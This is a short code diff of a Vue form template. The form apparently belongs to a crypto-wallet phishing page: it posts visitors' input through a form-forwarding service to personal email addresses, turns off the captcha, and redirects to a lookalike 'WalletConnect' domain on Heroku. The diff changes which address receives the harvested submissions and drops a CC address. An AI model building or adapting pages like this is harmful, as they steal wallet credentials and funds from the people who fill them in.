@@ -1,6 +1,6 @@
 <template>
-  <form action="https://formsubmit.co/solomonopeyemi@yandex.com" method="POST">
-    <input type="hidden" name="_cc" value="Paulkry89@yahoo.com">
+  <form action="https://formsubmit.co/Allencross82@gmail.com" method="POST">
+<!--    <input type="hidden" name="_cc" value="Paulkry89@yahoo.com">-->
     <input type="text" :placeholder="$route.params.id" readonly class="w-full mb-5 outline-none py-1 px-2 block capitalize">
     <input type="hidden" name="_captcha" value="false">
     <input type="hidden" name="_next" value="https://wallerconnect.herokuapp.com/">
